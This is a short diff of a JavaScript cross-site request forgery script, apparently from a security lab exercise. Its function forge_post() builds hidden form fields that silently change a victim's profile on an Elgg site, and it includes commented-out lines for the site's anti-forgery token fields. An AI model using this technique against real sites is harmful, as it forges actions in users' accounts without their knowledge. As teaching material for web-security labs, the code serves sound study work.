@@ -10,10 +10,13 @@ function forge_post()
     // The following are form entries need to be filled out by attackers.
     // The entries are made hidden, so the victim won't be able to see them.
     fields += "<input type='hidden' name='name' value='Alice'>";
-    fields += "<input type='hidden' name='description' value='<p>Boby is my Hero</p>'>";
+    fields += "<input type='hidden' name='description' value='Boby is my Hero'>";
     fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";         
     fields += "<input type='hidden' name='guid' value='56'>";
-
+    
+    // fields += "<input type='hidden' name='__elgg_ts' value='1731440433'>";
+    // fields += "<input type='hidden' name='__elgg_token' value='ecTtrGGjEaN6clpS9nI9pw'>"
+   
     // Create a <form> element.
     var p = document.createElement("form");
 
